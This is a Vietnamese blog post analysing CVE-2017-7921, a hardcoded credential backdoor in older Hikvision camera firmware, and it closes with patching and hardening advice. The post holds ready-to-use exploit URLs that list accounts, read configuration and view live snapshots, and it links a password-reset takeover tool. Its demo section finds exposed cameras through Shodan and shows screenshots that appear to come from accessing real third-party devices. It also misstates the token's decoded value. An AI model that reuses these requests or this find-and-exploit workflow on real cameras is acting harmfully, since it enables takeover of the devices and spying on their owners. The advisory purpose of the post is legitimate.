# Tổng quan
Trong cuộc sống hiện đại ngày nay, dưới sự bùng nổ của công nghệ thông tin và thiết bị IOT, camera an ninh là một vật dụng vô cùng quen thuộc và đóng vai trò quan trọng trong cả đời sống và sản xuất. Camera an ninh được sử dụng trong các cơ quan nhà nước, nhà máy, xí nghiệp và các hộ gia đình nhằm mục đích giám sát và đảm bảo an toàn, an ninh. Những chiếc camera thường được gắn ở những vị trí trọng yếu, nhiều người ra vào như: cổng ra vào, nhà máy, phòng họp, sân nhà nhằm quan sát được các hoạt động cũng như đảm bảo an toàn cho các khu vực trên. Không chỉ vậy, camera còn có thể được gắn trong phòng khách, phòng ngủ, trường học hoặc những nơi riêng tư khác nhằm mục đích giám sát. Vì những tác dụng to lớn trong đảm bảo an ninh mà camera được sử dụng rất rộng rãi. Hơn nữa với sự xuất hiện của nhiều hãng camera giá rẻ tràn lan trên thị trường khiến người dùng dễ dàng sở hữu cho mình một chiếc camera giá rẻ chỉ với vài trăm ngàn đồng. Tuy nhiên, đi đôi với vấn đề giá rẻ là vấn đề về sự bảo mật của những chiếc camera khiến cho chủ nhân của những chiếc camera trở thành nạn nhân của những cuộc tấn công mạng. Những vụ lộ lọt hình ảnh nhạy cảm của những người nổi tiếng một phần cũng đến từ việc khai thác lỗ hổng bảo mật các thiết bị camera được gắn tịa nhà riêng.

Bài viết này sẽ phân tích một lỗ hổng nghiêm trọng trên một thiết bị camera khá phổ biến trên thị trường. Bài viết nhằm mục đích giải thích và phân tích lỗ hổng cũng như sẽ đưa ra một số khuyến nghị giúp người dùng sử dụng camera một cách an toàn. Lỗ hổng được nghiên cứu và public bởi [IPVM Team](https://ipvm.com/reports/hik-exploit) và năm 2017. Lỗ hổng được gán mã [CVE-2017-7921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7921). Bài viết đi vào phân tích 1 vấn đề nhỏ nhưng từ đó có thể giúp người đọc có những hình dung về mỗi hiểm họa đối với thiết bị cameran an ninh và từ đó cảnh giác hơn trong quá trình sử dụng. Bài viết chỉ nói về một lỗ hổng bảo mật, không đánh đồng vấn đề bảo mật trên tất cả các thiết bị của hãng hay các hãng khác. Bài viết với mục đích phân tích kỹ thuật, mọi hành vi sử dụng cách cách thức tấn công trong bài viết nhằm mục đích xấu hay vi phạm pháp luật tôi đều không khuyến khích và không chịu trách nhiệm dưới mọi hình thức. Giờ mời các bạn cùng theo dõi nội dung.

![Nguô](https://images.viblo.asia/99f0390e-1ee7-4a2b-b7d5-731f8de2af89.jpg)
(Nguồn Internet)

# Phân tích lỗ hổng bảo mật
## Các thiết bị bị ảnh hưởng
Lỗ hổng hôm nay mình phân tích là lỗ hổng trên thiết bị Camera HIK Vision ở một số phiên bản cũ. Lý do phân tích lỗ hổng là do còn tồn tại rất nhiều các camera phiên bản cũ chưa được cập nhật và đang hiện hữu khả năng bị tấn công:
* Hikvision DS-2CD2xx2F-I Series V5.2.0 build 140721 to V5.4.0 build 160530, DS-2CD2xx0F-I Series V5.2.0 build 140721 to V5.4.0 Build 160401, DS-2CD2xx2FWD Series V5.3.1 build 150410 to V5.4.4 Build 161125, DS-2CD4x2xFWD Series V5.2.0 build 140721 to V5.4.0 Build 160414, DS-2CD4xx5 Series V5.2.0 build 140721 to V5.4.0 Build 160421, DS-2DFx Series V5.2.0 build 140805 to V5.4.5 Build 160928, and DS-2CD63xx Series V5.0.9 build 140305 to V5.3.5 Build 160106 devices
## Nguyên nhân của lỗ hổng
Theo các nhà nghiên cứu bảo mật, trong firmware các version trên của thiết bị tồn tại một "backdoor" (barkdoor - cửa hậu: Một đoạn code được hacker để lại sau khi tấn công vào hệ thống nhằm mục đích truy cập vào hệ thống ở những lần sau). Tuy nhiên phía hãng cho rằng "Hikvision chưa bao giờ thực hiện hoặc cố ý đưa các backdoor trong các sản phẩm của mình."  Điều đó là dễ hiểu vì đây là sản phẩm của họ. Backdoor được đặt trong mã nguồn của thiết bị như sau:
- Để truy cập vào các enpoint chúng ta cần có các đoạn mã để xác thực thiết bị, tuy nhiên trong thiết bị được "hardcode" một đoạn mã based64 với nội dung: `auth=YWRtaW46MTEK` đoạn này khi decoded ra sẽ có nội dung `jaadmin:11` đây chính là một tài khoản mặc định có quyền admin trong hệ thống. Từ việc sử đụng đoạn mã xác thực được coi là backdoor trên, hacker có thể truy cập tới các chức năng khác nhau của camera.
Lỗ hổng liên quan đến việc vượt qua cơ chế xác thực (Broken authentication) và vượt quyền (Broken Access Control). Vì thông tin được hardocde trong mã nguồn nên các biện pháp như sử dụng mật khẩu mạnh hay đổi mật khẩu không có tác dụng để ngăn chặn cuộc tấn công.
## Tác động của lỗ hổng và cách thức tấn công
Kẻ tấn công chỉ cần có IP của thiết bị camera là có thể thực hiện hành vi tấn công của mình bao gồm:

***1. Lấy danh sách toàn bộ tài khoản trên thiết bị camera***: 

* http://camera.ip/Security/users?auth=YWRtaW46MTEK
    
***2. Xem các config về bảo mật của thiết bị:***

* http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK
    
***3. Truy cập xem dữ liệu camera (hình ảnh snapshot trên thiết bị theo thời gian thực)***

* http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK
    
***4. Đổi mật khẩu bất kì tài khoản (bao gồm cả tài khoản admin) và chiếm quyền điều khiển thiết bị.***

* [Hikvision Password Reset Helper](https://github.com/bp2008/HikPasswordHelper/releases)
    
Việc có thể chiếm quyền điều khiển thiết bị là một lỗ hổng cực kì nghiêm trọng và khiến người dùng bị mất quyền kiểm soát thiết bị

# Demo tấn công
Để hình dung được mức độ  nguy hiểm của lỗ hổng dù đây là một lỗ hổng từ lâu, mình sẽ dử dụng công cụ shodan để tìm kiếm các thiết bị đang có nguy cơ bị tấn công. Để hiểu hơn về công cụ shodan các bạn theo dõi bài viết của mình tại đây: https://viblo.asia/p/shodan-cong-cu-tim-kiem-cho-kiem-thu-bao-mat-924lJJD0lPM
**Ở Việt Nam:**

![](https://images.viblo.asia/36608df1-9715-4975-81c5-c64fc5198254.png)


**Trên toàn thế giới:**

![](https://images.viblo.asia/a7aa0162-e8fc-47ad-b0b4-3be6bcac9e22.png)


**Xem hình ảnh snapshot**

http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK

![](https://images.viblo.asia/cb37a6e4-4509-46d6-a115-3c460eaa9ee3.png)

**Xem danh sách tài khoản**

http://camera.ip/Security/users?auth=YWRtaW46MTEK

![](https://images.viblo.asia/e0796f28-7a4b-44fb-8a2d-2d2951e23697.png)



# Khuyến nghị
**Đối với các thiết bị HIK Vision có firmware bị ảnh hưởng bởi lỗ hổng**

* Nếu các bạn đang sử dụng camera HIK Vision mà có phiên bản firmware bị lỗi trên hoặc các version cũ thì nhanh chóng cập nhật lên những phiên bản mới nhất của nhà sản xuất để đảm bảo an toàn bảo mật. Vì lỗ hổng tấn công qua backdor nên việc đổi mật khẩu admin quản trị sẽ không có tác dụng.

**Đối với các thiết bị camera khác các bạn cũng cần tìm hiểu để nâng cao an toàn bằng một số biện pháp sau**:

* Sử dụng mật khẩu mạnh, không sử dụng mật khẩu mặc định hay mật khẩu dễ đoán.
* Thường xuyên cập nhật firmware nên phiên bản mới nhất để tránh các lỗ hổng bảo mật
* Tránh sử dụng các camera không rõ nguồn gốc, sử dụng các hãng uy tín
*  Tránh việc để các thiết bị camera public ra internet, để an toàn chúng ta nên sử dụng biện pháp chạy mạng nội bộ đối với những hệ thống camera quan trọng
* Hạn chế để camera ở những nơi nhạy cảm
*  Thường xuyên theo dõi các tin tức trên báo chí để cập nhật thông tin